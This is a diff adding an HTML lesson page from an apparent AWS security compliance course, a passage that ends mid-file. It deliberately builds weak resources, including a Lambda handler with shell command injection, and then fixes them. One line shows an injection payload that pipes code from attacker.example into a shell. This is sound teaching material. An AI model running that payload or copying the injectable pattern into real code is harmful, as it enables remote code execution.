@@ -1,0 +1,811 @@
+<!DOCTYPE html>
+<!-- build: 2026100701 -->
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Module 3: Vulnerability Management and Application Security Testing — Prowler Security Compliance Labs</title>
+<style>
+:root{--blue:#1a6eb5;--blue-d:#12507f;--blue-l:#eaf3fb;--ink:#1a2733;--mut:#5a6b7a;--line:#e2e8ef;--ok:#127a3e;--ok-bg:#e8f6ee;--no:#b5341a;--no-bg:#fdecea;--amber:#8a5a00;--amber-bg:#fff6e0;--bg:#f5f8fb;--code:#0f1e2c;}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;font-family:-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;background:var(--bg);color:var(--ink);line-height:1.6;font-size:15px}
+a{color:var(--blue)}
+.topbar{background:#fff;border-bottom:1px solid var(--line);position:sticky;top:0;z-index:50}
+.topbar-in{max-width:980px;margin:0 auto;padding:10px 20px;display:flex;align-items:center;gap:12px;flex-wrap:wrap}
+.badge{background:var(--blue);color:#fff;font-weight:700;font-size:12.5px;padding:4px 11px;border-radius:20px;letter-spacing:.3px;text-decoration:none}
+.crumb{color:var(--mut);font-size:13px}
+.user{margin-left:auto;font-size:12.5px;color:var(--mut);display:flex;align-items:center;gap:10px}
+.signout{background:none;border:0;color:var(--blue);font-size:12.5px;cursor:pointer;text-decoration:underline;font-family:inherit;padding:0}
+.wrap{max-width:980px;margin:0 auto;padding:26px 20px 70px}
+#app{display:none}
+.hero{margin:6px 0 22px}
+.hero .kicker{color:var(--blue);font-weight:700;font-size:13px;letter-spacing:.4px;text-transform:uppercase}
+.hero h1{font-size:27px;line-height:1.25;margin:4px 0 8px}
+.hero p{color:var(--mut);margin:0}
+.chips{display:flex;flex-wrap:wrap;gap:8px;margin-top:12px}
+.chip{background:#fff;border:1px solid var(--line);border-radius:20px;padding:3px 11px;font-size:12.5px;color:var(--mut)}
+.chip b{color:var(--ink)}
+.toc{background:#fff;border:1px solid var(--line);border-radius:12px;padding:14px 18px;margin:0 0 22px}
+.toc h3{margin:0 0 6px;font-size:14px}
+.toc ol{margin:0;padding-left:20px;font-size:14px}
+section.sec{background:#fff;border:1px solid var(--line);border-radius:14px;padding:22px 24px;margin:0 0 18px;box-shadow:0 1px 3px rgba(20,50,80,.04)}
+section.sec h2{font-size:19px;margin:0 0 10px;color:var(--blue-d)}
+section.sec h3{font-size:15.5px;margin:18px 0 6px}
+section.sec p{margin:8px 0}
+.limits{background:var(--amber-bg);border:1px solid #f0cf86;border-left:5px solid #e0a030;border-radius:12px;padding:16px 20px;margin:0 0 18px}
+.limits h2{margin:0 0 6px;font-size:16px;color:var(--amber)}
+.limits ul{margin:6px 0 0;padding-left:20px}
+.limits li{margin:4px 0}
+.note{border-radius:10px;padding:11px 14px;margin:12px 0;font-size:14px}
+.note.info{background:var(--blue-l);border:1px solid #cfe2f3}
+.note.warn{background:var(--amber-bg);border:1px solid #f0cf86}
+.note.cost{background:#f3f0fb;border:1px solid #ddd3f3}
+.note.ok{background:var(--ok-bg);border:1px solid #bfe4cd}
+.code{position:relative;background:var(--code);border-radius:10px;margin:10px 0 14px;overflow:hidden}
+.code-title{background:#1c3044;color:#cfe2f3;font-size:12px;font-family:ui-monospace,Menlo,Consolas,monospace;padding:6px 12px}
+.code pre{margin:0;padding:14px 14px;overflow-x:auto}
+.code code{font-family:ui-monospace,Menlo,Consolas,monospace;font-size:12.8px;line-height:1.55;color:#e6eef6;white-space:pre}
+.code .copy{position:absolute;right:8px;top:6px;background:#2a4560;color:#fff;border:0;border-radius:6px;font-size:11.5px;padding:3px 9px;cursor:pointer;font-family:inherit}
+.code .copy:hover{background:var(--blue)}
+.diff code span{display:block}
+.diff .add{background:rgba(46,160,67,.22);color:#c8f5d2}
+.diff .del{background:rgba(220,60,40,.22);color:#ffd2cc}
+.diff .ctx{color:#b9c7d4}
+code{font-family:ui-monospace,Menlo,Consolas,monospace;font-size:.88em}
+p code,li code,td code{background:#eef3f8;border-radius:4px;padding:1px 5px;word-break:break-word}
+.tbl{overflow-x:auto;margin:10px 0 14px}
+table{border-collapse:collapse;width:100%;font-size:13.5px;background:#fff}
+th{background:var(--blue);color:#fff;text-align:left;padding:8px 10px;font-weight:600}
+td{border-bottom:1px solid var(--line);padding:8px 10px;vertical-align:top}
+tr:nth-child(even) td{background:#f8fbfd}
+.before{color:var(--no);font-weight:600}
+.after{color:var(--ok);font-weight:600}
+details.file{border:1px solid var(--line);border-radius:10px;margin:8px 0;background:#fbfdff}
+details.file summary{cursor:pointer;padding:10px 14px;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:13px;font-weight:600}
+details.file .code{margin:0 10px 10px}
+/* assessment */
+.assess .q{border:1px solid var(--line);border-radius:12px;padding:14px 16px;margin:12px 0;background:#fbfdff}
+.assess .q-t{font-weight:600;margin-bottom:8px}
+.assess label.opt{display:flex;gap:10px;align-items:flex-start;padding:7px 10px;border-radius:8px;cursor:pointer;margin:3px 0;border:1px solid transparent}
+.assess label.opt:hover{background:var(--blue-l)}
+.assess label.opt input{margin-top:4px}
+.assess .q.done label.opt{cursor:default}
+.assess .q.done label.opt:hover{background:none}
+.assess label.opt.right{background:var(--ok-bg);border-color:#bfe4cd}
+.assess label.opt.wrong{background:var(--no-bg);border-color:#f3c3bb}
+.assess .expl{display:none;margin-top:8px;font-size:14px;background:#fff;border-left:4px solid var(--blue);padding:8px 12px;border-radius:6px}
+.assess .q.done .expl{display:block}
+.assess .expl b.r{color:var(--ok)}.assess .expl b.w{color:var(--no)}
+.btn{background:var(--blue);color:#fff;border:0;border-radius:10px;padding:11px 18px;font-size:14.5px;font-weight:600;cursor:pointer;font-family:inherit;text-decoration:none;display:inline-block}
+.btn:hover{background:var(--blue-d)}
+.btn:disabled{background:#a9bccd;cursor:not-allowed}
+.btn.ghost{background:#fff;color:var(--blue);border:1.5px solid var(--blue)}
+.btn.ghost:hover{background:var(--blue-l)}
+.result{border-radius:12px;padding:14px 16px;margin:14px 0;font-weight:600}
+.result.pass{background:var(--ok-bg);color:var(--ok);border:1px solid #bfe4cd}
+.result.fail{background:var(--no-bg);color:var(--no);border:1px solid #f3c3bb}
+.result small{display:block;font-weight:400;color:var(--ink);margin-top:4px}
+.attempts{font-size:13px;color:var(--mut);margin-top:6px}
+.complete-box{display:flex;align-items:center;gap:14px;flex-wrap:wrap}
+.complete-box .status{font-size:14px;color:var(--mut)}
+.complete-box .status.done{color:var(--ok);font-weight:700}
+.navrow{display:flex;justify-content:space-between;gap:10px;margin-top:20px;flex-wrap:wrap}
+.foot{text-align:center;color:var(--mut);font-size:12px;margin-top:30px}
+/* dashboard */
+.progress{background:#fff;border:1px solid var(--line);border-radius:14px;padding:16px 20px;margin-bottom:18px}
+.bar{height:10px;background:var(--line);border-radius:6px;overflow:hidden;margin-top:8px}
+.bar span{display:block;height:100%;background:var(--blue);width:0}
+.mods{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+@media(max-width:720px){.mods{grid-template-columns:1fr}}
+.mod{background:#fff;border:1px solid var(--line);border-radius:14px;padding:18px 20px;display:flex;flex-direction:column}
+.mod .num{font-size:12px;font-weight:700;color:var(--blue);text-transform:uppercase;letter-spacing:.4px}
+.mod h3{margin:3px 0 6px;font-size:16.5px}
+.mod p{margin:0 0 12px;color:var(--mut);font-size:13.5px}
+.mod .meta{display:flex;justify-content:space-between;align-items:center;margin-top:auto;gap:10px}
+.st{font-size:12px;font-weight:700;padding:3px 10px;border-radius:12px}
+.st.ns{background:#eef2f6;color:var(--mut)}
+.st.ip{background:var(--amber-bg);color:var(--amber)}
+.st.ps{background:var(--blue-l);color:var(--blue-d)}
+.st.cp{background:var(--ok-bg);color:var(--ok)}
+.score{font-size:12.5px;color:var(--mut)}
+@media(max-width:600px){section.sec{padding:18px 16px}.hero h1{font-size:23px}}
+</style>
+</head>
+<body>
+
+<div class="topbar"><div class="topbar-in">
+  <a class="badge" href="index.html?v=2026100701">Prowler Labs</a>
+  <span class="crumb">Module 3 of 8</span>
+  <span class="user" id="user"></span>
+</div></div>
+<div class="wrap" id="app">
+  <div class="hero">
+    <div class="kicker">Module 3</div>
+    <h1>Vulnerability Management and Application Security Testing</h1>
+    <p>Scan servers, container images and Lambda code for known software weaknesses. Use cases 3: Vulnerability Management and 6: Application Security Testing.</p>
+    <div class="chips"><span class="chip"><b>Use cases:</b> 3. Vulnerability Management, 6. Application Security Testing</span><span class="chip"><b>Services:</b> Inspector, ECR, EC2, Lambda</span><span class="chip"><b>Time:</b> about 90 minutes</span><span class="chip"><b>Cost:</b> free trial and free tier</span></div>
+  </div>
+  <div class="limits"><h2>Limits of what Prowler checks in this module</h2><ul><li>Prowler checks that Amazon Inspector and ECR scanning are turned on and whether vulnerability findings are open. It does not scan software itself.</li><li>Prowler does not run application security tests on a running application or penetration tests, which PCI-DSS requires separately.</li><li>Inspector only reports weaknesses that are already publicly known. It cannot find new, unknown weaknesses.</li></ul></div>
+  <nav class="toc"><h3>In this module</h3><ol><li><a href="#about">What these two use cases mean</a></li><li><a href="#lib">Step 1: Add a shared function for launching the instance</a></li><li><a href="#build">Step 2: Build the weak setup (before state)</a></li><li><a href="#scan-before">Step 3: Scan and read the results</a></li><li><a href="#fix">Step 4: Fix the weaknesses (after state)</a></li><li><a href="#scan-after">Step 5: Scan again and compare</a></li><li><a href="#cleanup">Step 6: Add this module to the clean-up script</a></li><li><a href="#files">Complete files for this module</a></li><li><a href="#assessment">Module assessment</a></li></ol></nav>
+  <section class="sec" id="about"><h2>What these two use cases mean</h2>
+<div class="tbl"><table class=""><thead><tr><th>Use case</th><th>What it means</th><th>AWS service in this module</th></tr></thead><tbody><tr><td>3. Vulnerability Management</td><td>Finding known weaknesses (published as CVEs) in the operating system and software packages of servers and container images, and installing updates.</td><td>Amazon Inspector for EC2 and ECR</td></tr><tr><td>6. Application Security Testing</td><td>Finding weaknesses in your own application code and its libraries before an attacker does.</td><td>Amazon Inspector Lambda code scanning, ECR image scanning</td></tr></tbody></table></div>
+<p>Amazon Inspector does the scanning. Prowler checks that Inspector and image scanning are turned on, and whether vulnerability findings are still open.</p>
+<div class="note cost"><b>Cost:</b> Amazon Inspector has a 15-day free trial. The EC2 instance is a <code>t3.micro</code>, which is free-tier eligible for many accounts. ECR storage for two small images costs a few cents. Stop or remove the instance when you finish the course.</div>
+<div class="note info">You need Docker running for this module. The image is built for <code>linux/amd64</code>, so it also builds on Apple silicon computers.</div>
+</section><section class="sec" id="lib"><h2>Step 1: Add a shared function for launching the instance</h2>
+<p>The project's EC2 instance is launched again in Module 5, so the launch command goes into a shared file.</p>
+<div class="code"><div class="code-title">lib/launch-instance.sh</div><button class="copy" type="button">Copy</button><pre><code class="lang-bash"># lib/launch-instance.sh — shared function to launch the project's EC2 instance
+# Usage: launch_instance &lt;optional|required&gt;
+#   optional = instance metadata version 1 allowed (weak)
+#   required = instance metadata version 2 only (strong)
+launch_instance() {
+  local tokens="$1"
+  local ami
+  ami=$(aws ssm get-parameter "${A[@]}" \
+    --name /aws/service/ami-amazon-linux-latest/al2023-ami-kernel-default-x86_64 \
+    --query Parameter.Value --output text)
+  aws ec2 run-instances "${A[@]}" \
+    --image-id "$ami" --instance-type t3.micro \
+    --security-group-ids "$SG_ID" \
+    --iam-instance-profile Name="$PROJECT-ec2-profile" \
+    --metadata-options "HttpTokens=$tokens,HttpEndpoint=enabled" \
+    --tag-specifications "ResourceType=instance,Tags=[{Key=Name,Value=$PROJECT-app}]" \
+    --query 'Instances[0].InstanceId' --output text
+}</code></pre></div>
+</section><section class="sec" id="build"><h2>Step 2: Build the weak setup (before state)</h2>
+<p>The build script creates an EC2 instance that still allows the old instance metadata service (version 1), an ECR repository without scan on push holding an image with old libraries, and a Lambda function that passes caller input to a shell.</p>
+<div class="code"><div class="code-title">build/m3-build.sh</div><button class="copy" type="button">Copy</button><pre><code class="lang-bash">#!/usr/bin/env bash
+# Module 3 build: server, container image and Lambda code with weaknesses (before state)
+set -euo pipefail
+cd "$(dirname "$0")/.."
+source ./env.sh
+source ./lib/launch-instance.sh
+
+# 1. Role for the EC2 instance (Systems Manager agent: patching and Session Manager)
+cat &gt; policies/ec2-trust.json &lt;&lt;'EOF'
+{"Version": "2012-10-17",
+ "Statement": [{"Effect": "Allow", "Principal": {"Service": "ec2.amazonaws.com"},
+                "Action": "sts:AssumeRole"}]}
+EOF
+aws iam create-role "${G[@]}" --role-name "$PROJECT-ec2-role" \
+  --assume-role-policy-document file://policies/ec2-trust.json
+aws iam attach-role-policy "${G[@]}" --role-name "$PROJECT-ec2-role" \
+  --policy-arn arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore
+aws iam create-instance-profile "${G[@]}" --instance-profile-name "$PROJECT-ec2-profile"
+aws iam add-role-to-instance-profile "${G[@]}" \
+  --instance-profile-name "$PROJECT-ec2-profile" --role-name "$PROJECT-ec2-role"
+sleep 15   # give IAM time to make the instance profile available
+
+# 2. Security group in the default VPC, with no inbound rules
+VPC_ID=$(aws ec2 describe-vpcs "${A[@]}" --filters Name=isDefault,Values=true \
+  --query 'Vpcs[0].VpcId' --output text)
+save_id VPC_ID "$VPC_ID"
+SG_ID=$(aws ec2 create-security-group "${A[@]}" --group-name "$PROJECT-app-sg" \
+  --description "sf-secure-store app" --vpc-id "$VPC_ID" --query GroupId --output text)
+save_id SG_ID "$SG_ID"
+
+# 3. EC2 instance that still allows instance metadata version 1 (weak)
+INSTANCE_ID=$(launch_instance optional)
+save_id INSTANCE_ID "$INSTANCE_ID"
+aws ec2 wait instance-running "${A[@]}" --instance-ids "$INSTANCE_ID"
+
+# 4. ECR repository without scan on push (weak)
+aws ecr create-repository "${A[@]}" --repository-name "$PROJECT/api" \
+  --image-scanning-configuration scanOnPush=false
+
+# Container image with an old base image and old libraries (weak)
+mkdir -p app/container
+cat &gt; app/container/Dockerfile &lt;&lt;'EOF'
+FROM python:3.8-slim
+COPY requirements.txt .
+RUN pip install --no-cache-dir -r requirements.txt
+CMD ["python", "-c", "print('sf-secure-store api')"]
+EOF
+printf 'requests==2.19.1\nurllib3==1.23\n' &gt; app/container/requirements.txt
+
+REGISTRY="$ACCOUNT_ID.dkr.ecr.$AWS_REGION.amazonaws.com"
+aws ecr get-login-password "${A[@]}" | docker login --username AWS --password-stdin "$REGISTRY"
+docker build --platform linux/amd64 -t "$REGISTRY/$PROJECT/api:v1" app/container
+docker tag "$REGISTRY/$PROJECT/api:v1" "$REGISTRY/$PROJECT/api:latest"
+docker push "$REGISTRY/$PROJECT/api:v1"
+docker push "$REGISTRY/$PROJECT/api:latest"
+
+# 5. Lambda function with an unsafe code pattern (weak)
+cat &gt; policies/lambda-trust.json &lt;&lt;'EOF'
+{"Version": "2012-10-17",
+ "Statement": [{"Effect": "Allow", "Principal": {"Service": "lambda.amazonaws.com"},
+                "Action": "sts:AssumeRole"}]}
+EOF
+aws iam create-role "${G[@]}" --role-name "$PROJECT-lambda-role" \
+  --assume-role-policy-document file://policies/lambda-trust.json
+aws iam attach-role-policy "${G[@]}" --role-name "$PROJECT-lambda-role" \
+  --policy-arn arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole
+sleep 10
+
+mkdir -p app/lambda
+cat &gt; app/lambda/report.py &lt;&lt;'EOF'
+import subprocess
+
+
+def handler(event, context):
+    # Weak: the report name comes from the caller and is passed to a shell
+    name = event.get("report", "daily")
+    out = subprocess.run("cat /tmp/" + name + ".txt", shell=True,
+                         capture_output=True, text=True)
+    return {"output": out.stdout}
+EOF
+(cd app/lambda &amp;&amp; zip -q report.zip report.py)
+aws lambda create-function "${A[@]}" --function-name "$PROJECT-report" \
+  --runtime python3.12 --handler report.handler \
+  --role "arn:aws:iam::$ACCOUNT_ID:role/$PROJECT-lambda-role" \
+  --zip-file fileb://app/lambda/report.zip
+
+echo "Module 3 build complete."</code></pre></div>
+<div class="code"><button class="copy" type="button">Copy</button><pre><code class="lang-bash">chmod +x build/m3-build.sh
+./build/m3-build.sh</code></pre></div>
+<h3>The weak Lambda code</h3>
+<div class="code"><div class="code-title">app/lambda/report.py (before)</div><button class="copy" type="button">Copy</button><pre><code class="lang-python">import subprocess
+
+
+def handler(event, context):
+    # Weak: the report name comes from the caller and is passed to a shell
+    name = event.get("report", "daily")
+    out = subprocess.run("cat /tmp/" + name + ".txt", shell=True,
+                         capture_output=True, text=True)
+    return {"output": out.stdout}</code></pre></div>
+<p>A caller can send <code>{"report": "x; curl http://attacker.example | sh"}</code>. Because the text is joined into a shell command, the extra command runs inside the function. This is called <b>command injection</b>.</p>
+<div class="note warn">If your account has no default VPC in ap-south-1, create one first with <code>aws ec2 create-default-vpc --profile lab-admin --region ap-south-1</code>.</div>
+</section><section class="sec" id="scan-before"><h2>Step 3: Scan and read the results</h2>
+<div class="code"><button class="copy" type="button">Copy</button><pre><code class="lang-bash">source ./env.sh
+pscan --service inspector2 ecr ec2 awslambda -o scans/m3-before</code></pre></div>
+<div class="tbl"><table class=""><thead><tr><th>Check</th><th>Expected result</th><th>Why it fails</th></tr></thead><tbody><tr><td><code>inspector2_is_enabled</code></td><td>FAIL</td><td>Amazon Inspector is off, so nothing scans the server, the images or the Lambda code.</td></tr><tr><td><code>ecr_repositories_scan_images_on_push_enabled</code></td><td>FAIL</td><td>New images are stored without being scanned.</td></tr><tr><td><code>ec2_instance_imdsv2_enabled</code></td><td>FAIL</td><td>The instance still accepts instance metadata version 1, which can expose its role credentials through a web request forgery attack.</td></tr></tbody></table></div>
+<div class="note info">You will see other EC2 failures as well, for example the instance has a public IP address. Focus on the checks in the table; Module 6 covers network settings.</div>
+<h3>Link to the compliance frameworks</h3>
+<div class="tbl"><table class=""><thead><tr><th>Framework</th><th>Related requirement area</th></tr></thead><tbody><tr><td>PCI-DSS v4.0</td><td>Requirement 6.3: identify and fix security vulnerabilities; 11.3: run vulnerability scans</td></tr><tr><td>ISO 27001:2022</td><td>Control 8.8 Management of technical vulnerabilities; 8.28 Secure coding</td></tr><tr><td>SOC 2</td><td>CC7.1: detect configuration changes and new vulnerabilities</td></tr><tr><td>HIPAA</td><td>164.308(a)(1)(ii)(A) risk analysis and (B) risk management</td></tr><tr><td>GDPR</td><td>Article 32 security of processing</td></tr><tr><td>CIS AWS Foundations Benchmark</td><td>EC2 settings such as requiring instance metadata version 2</td></tr><tr><td>AWS Well-Architected, Security Pillar</td><td>Infrastructure protection: automate patching and scan for vulnerabilities</td></tr></tbody></table></div>
+</section><section class="sec" id="fix"><h2>Step 4: Fix the weaknesses (after state)</h2>
+<div class="code"><div class="code-title">fix/m3-fix.sh</div><button class="copy" type="button">Copy</button><pre><code class="lang-bash">#!/usr/bin/env bash
+# Module 3 fix: turn on Inspector, patch and harden (after state)
+set -euo pipefail
+cd "$(dirname "$0")/.."
+source ./env.sh
+
+# 1. Amazon Inspector for EC2, ECR images, Lambda packages and Lambda code
+aws inspector2 enable "${A[@]}" --resource-types EC2 ECR LAMBDA LAMBDA_CODE
+
+# 2. EC2: require instance metadata version 2, then install security updates
+aws ec2 modify-instance-metadata-options "${A[@]}" --instance-id "$INSTANCE_ID" \
+  --http-tokens required --http-endpoint enabled
+aws ssm send-command "${A[@]}" --document-name AWS-RunPatchBaseline \
+  --targets "Key=InstanceIds,Values=$INSTANCE_ID" \
+  --parameters Operation=Install --comment "sf-secure-store patching" \
+  --query Command.CommandId --output text
+
+# 3. ECR: scan on push, then push an image with an updated base and libraries
+aws ecr put-image-scanning-configuration "${A[@]}" --repository-name "$PROJECT/api" \
+  --image-scanning-configuration scanOnPush=true
+cat &gt; app/container/Dockerfile &lt;&lt;'EOF'
+FROM python:3.12-slim
+COPY requirements.txt .
+RUN pip install --no-cache-dir -r requirements.txt
+CMD ["python", "-c", "print('sf-secure-store api')"]
+EOF
+printf 'requests==2.32.3\nurllib3==2.2.3\n' &gt; app/container/requirements.txt
+
+REGISTRY="$ACCOUNT_ID.dkr.ecr.$AWS_REGION.amazonaws.com"
+aws ecr get-login-password "${A[@]}" | docker login --username AWS --password-stdin "$REGISTRY"
+docker build --platform linux/amd64 -t "$REGISTRY/$PROJECT/api:v2" app/container
+docker tag "$REGISTRY/$PROJECT/api:v2" "$REGISTRY/$PROJECT/api:latest"
+docker push "$REGISTRY/$PROJECT/api:v2"
+docker push "$REGISTRY/$PROJECT/api:latest"
+
+# 4. Lambda: accept only known report names and do not use a shell
+cat &gt; app/lambda/report.py &lt;&lt;'EOF'
+import subprocess
+
+ALLOWED_REPORTS = {"daily", "weekly"}
+
+
+def handler(event, context):
+    # Fixed: only known report names are accepted, and no shell is used
+    name = event.get("report", "daily")
+    if name not in ALLOWED_REPORTS:
+        return {"error": "unknown report"}
+    out = subprocess.run(["cat", f"/tmp/{name}.txt"],
+                         capture_output=True, text=True)
+    return {"output": out.stdout}
+EOF
+(cd app/lambda &amp;&amp; rm -f report.zip &amp;&amp; zip -q report.zip report.py)
+aws lambda update-function-code "${A[@]}" --function-name "$PROJECT-report" \
+  --zip-file fileb://app/lambda/report.zip
+
+echo "Module 3 fix complete. Wait 20 to 30 minutes for Amazon Inspector to finish scanning."</code></pre></div>
+<div class="code"><button class="copy" type="button">Copy</button><pre><code class="lang-bash">chmod +x fix/m3-fix.sh
+./fix/m3-fix.sh</code></pre></div>
+<h3>What changed</h3>
+<div class="code diff"><div class="code-title">EC2 instance</div><pre><code><span class="ctx">  EC2 instance metadata options</span><span class="del">- HttpTokens=optional   (version 1 and version 2 allowed)</span><span class="add">+ HttpTokens=required   (version 2 only)</span><span class="add">+ security updates installed with AWS-RunPatchBaseline</span></code></pre></div>
+<div class="code diff"><div class="code-title">Container image and repository</div><pre><code><span class="ctx">  app/container/Dockerfile and requirements.txt</span><span class="del">- FROM python:3.8-slim</span><span class="add">+ FROM python:3.12-slim</span><span class="del">- requests==2.19.1</span><span class="del">- urllib3==1.23</span><span class="add">+ requests==2.32.3</span><span class="add">+ urllib3==2.2.3</span><span class="ctx">  ECR repository</span><span class="del">- scanOnPush=false</span><span class="add">+ scanOnPush=true</span></code></pre></div>
+<div class="code diff"><div class="code-title">app/lambda/report.py</div><pre><code><span class="ctx">  import subprocess</span><span class="add">+</span><span class="add">+ ALLOWED_REPORTS = {"daily", "weekly"}</span><span class="ctx"> </span><span class="ctx">  def handler(event, context):</span><span class="ctx">      name = event.get("report", "daily")</span><span class="del">-     out = subprocess.run("cat /tmp/" + name + ".txt", shell=True,</span><span class="del">-                          capture_output=True, text=True)</span><span class="add">+     if name not in ALLOWED_REPORTS:</span><span class="add">+         return {"error": "unknown report"}</span><span class="add">+     out = subprocess.run(["cat", f"/tmp/{name}.txt"],</span><span class="add">+                          capture_output=True, text=True)</span><span class="ctx">      return {"output": out.stdout}</span></code></pre></div>
+<h3>Read the Inspector findings</h3>
+<p>Inspector needs 20 to 30 minutes for its first scans. Then open Amazon Inspector in the AWS console and go to <b>Findings &gt; By repository</b> and <b>By Lambda function</b>. For the <code>v1</code> image you will see findings for the old <code>requests</code> and <code>urllib3</code> libraries, each with a CVE ID, a severity and the fixed version. Lambda code scanning may report the shell command pattern in the original code; because you replaced the code, its findings close at the next scan.</p>
+<div class="code"><button class="copy" type="button">Copy</button><pre><code class="lang-bash"># Count open Inspector findings by severity
+aws inspector2 list-finding-aggregations "${A[@]}" --aggregation-type ACCOUNT \
+  --query 'responses[0].accountAggregation.severityCounts' </code></pre></div>
+</section><section class="sec" id="scan-after"><h2>Step 5: Scan again and compare</h2>
+<div class="code"><button class="copy" type="button">Copy</button><pre><code class="lang-bash">pscan --service inspector2 ecr ec2 awslambda -o scans/m3-after</code></pre></div>
+<div class="tbl"><table class="ba"><thead><tr><th>Resource or setting</th><th>Before (weak)</th><th>After (fixed)</th><th>Prowler checks</th></tr></thead><tbody><tr><td>Amazon Inspector</td><td><span class="before">Off</span></td><td><span class="after">On for EC2, ECR, Lambda and Lambda code</span></td><td><code>inspector2_is_enabled</code><br><code>inspector2_active_findings_exist</code></td></tr><tr><td>ECR repository</td><td><span class="before">No scan on push, image with old libraries</span></td><td><span class="after">Scan on push, image with updated libraries</span></td><td><code>ecr_repositories_scan_images_on_push_enabled</code><br><code>ecr_repositories_scan_vulnerabilities_in_latest_image</code></td></tr><tr><td>EC2 instance</td><td><span class="before">Metadata version 1 allowed, no updates</span></td><td><span class="after">Metadata version 2 only, updates installed</span></td><td><code>ec2_instance_imdsv2_enabled</code></td></tr><tr><td>Lambda code</td><td><span class="before">Caller input passed to a shell</span></td><td><span class="after">Allowed values only, no shell</span></td><td><code>(reported through Inspector findings)</code></td></tr></tbody></table></div>
+<p><code>inspector2_active_findings_exist</code> may still fail if Inspector finds vulnerabilities in the operating system or in the old <code>v1</code> image, which is still stored. That is the check doing its job: it tells you open vulnerabilities remain. Delete the old image tag with <code>aws ecr batch-delete-image "${A[@]}" --repository-name "$PROJECT/api" --image-ids imageTag=v1</code> and scan again later.</p>
+</section><section class="sec" id="cleanup"><h2>Step 6: Add this module to the clean-up script</h2>
+<p>Keep the instance and roles: Modules 4, 5 and 6 use them. Paste this block into <code>cleanup.sh</code> directly <b>below</b> the <code>set +e</code> line.</p>
+<div class="code"><div class="code-title">cleanup.sh — Module 3 block</div><button class="copy" type="button">Copy</button><pre><code class="lang-bash"># --- Module 3: Vulnerability Management and Application Security Testing ---
+aws inspector2 disable "${A[@]}" --resource-types EC2 ECR LAMBDA LAMBDA_CODE
+aws lambda delete-function "${A[@]}" --function-name "$PROJECT-report"
+aws iam detach-role-policy "${G[@]}" --role-name "$PROJECT-lambda-role" \
+  --policy-arn arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole
+aws iam delete-role "${G[@]}" --role-name "$PROJECT-lambda-role"
+aws ecr delete-repository "${A[@]}" --repository-name "$PROJECT/api" --force
+aws ec2 terminate-instances "${A[@]}" --instance-ids "$INSTANCE_ID"
+aws ec2 wait instance-terminated "${A[@]}" --instance-ids "$INSTANCE_ID"
+aws ec2 delete-security-group "${A[@]}" --group-id "$SG_ID"
+aws iam remove-role-from-instance-profile "${G[@]}" \
+  --instance-profile-name "$PROJECT-ec2-profile" --role-name "$PROJECT-ec2-role"
+aws iam delete-instance-profile "${G[@]}" --instance-profile-name "$PROJECT-ec2-profile"
+aws iam detach-role-policy "${G[@]}" --role-name "$PROJECT-ec2-role" \
+  --policy-arn arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore
+aws iam delete-role "${G[@]}" --role-name "$PROJECT-ec2-role"</code></pre></div>
+</section><section class="sec" id="files"><h2>Complete files for this module</h2><details class="file"><summary>lib/launch-instance.sh</summary><div class="code"><button class="copy" type="button">Copy</button><pre><code class="lang-bash"># lib/launch-instance.sh — shared function to launch the project's EC2 instance
+# Usage: launch_instance &lt;optional|required&gt;
+#   optional = instance metadata version 1 allowed (weak)
+#   required = instance metadata version 2 only (strong)
+launch_instance() {
+  local tokens="$1"
+  local ami
+  ami=$(aws ssm get-parameter "${A[@]}" \
+    --name /aws/service/ami-amazon-linux-latest/al2023-ami-kernel-default-x86_64 \
+    --query Parameter.Value --output text)
+  aws ec2 run-instances "${A[@]}" \
+    --image-id "$ami" --instance-type t3.micro \
+    --security-group-ids "$SG_ID" \
+    --iam-instance-profile Name="$PROJECT-ec2-profile" \
+    --metadata-options "HttpTokens=$tokens,HttpEndpoint=enabled" \
+    --tag-specifications "ResourceType=instance,Tags=[{Key=Name,Value=$PROJECT-app}]" \
+    --query 'Instances[0].InstanceId' --output text
+}</code></pre></div></details><details class="file"><summary>build/m3-build.sh</summary><div class="code"><button class="copy" type="button">Copy</button><pre><code class="lang-bash">#!/usr/bin/env bash
+# Module 3 build: server, container image and Lambda code with weaknesses (before state)
+set -euo pipefail
+cd "$(dirname "$0")/.."
+source ./env.sh
+source ./lib/launch-instance.sh
+
+# 1. Role for the EC2 instance (Systems Manager agent: patching and Session Manager)
+cat &gt; policies/ec2-trust.json &lt;&lt;'EOF'
+{"Version": "2012-10-17",
+ "Statement": [{"Effect": "Allow", "Principal": {"Service": "ec2.amazonaws.com"},
+                "Action": "sts:AssumeRole"}]}
+EOF
+aws iam create-role "${G[@]}" --role-name "$PROJECT-ec2-role" \
+  --assume-role-policy-document file://policies/ec2-trust.json
+aws iam attach-role-policy "${G[@]}" --role-name "$PROJECT-ec2-role" \
+  --policy-arn arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore
+aws iam create-instance-profile "${G[@]}" --instance-profile-name "$PROJECT-ec2-profile"
+aws iam add-role-to-instance-profile "${G[@]}" \
+  --instance-profile-name "$PROJECT-ec2-profile" --role-name "$PROJECT-ec2-role"
+sleep 15   # give IAM time to make the instance profile available
+
+# 2. Security group in the default VPC, with no inbound rules
+VPC_ID=$(aws ec2 describe-vpcs "${A[@]}" --filters Name=isDefault,Values=true \
+  --query 'Vpcs[0].VpcId' --output text)
+save_id VPC_ID "$VPC_ID"
+SG_ID=$(aws ec2 create-security-group "${A[@]}" --group-name "$PROJECT-app-sg" \
+  --description "sf-secure-store app" --vpc-id "$VPC_ID" --query GroupId --output text)
+save_id SG_ID "$SG_ID"
+
+# 3. EC2 instance that still allows instance metadata version 1 (weak)
+INSTANCE_ID=$(launch_instance optional)
+save_id INSTANCE_ID "$INSTANCE_ID"
+aws ec2 wait instance-running "${A[@]}" --instance-ids "$INSTANCE_ID"
+
+# 4. ECR repository without scan on push (weak)
+aws ecr create-repository "${A[@]}" --repository-name "$PROJECT/api" \
+  --image-scanning-configuration scanOnPush=false
+
+# Container image with an old base image and old libraries (weak)
+mkdir -p app/container
+cat &gt; app/container/Dockerfile &lt;&lt;'EOF'
+FROM python:3.8-slim
+COPY requirements.txt .
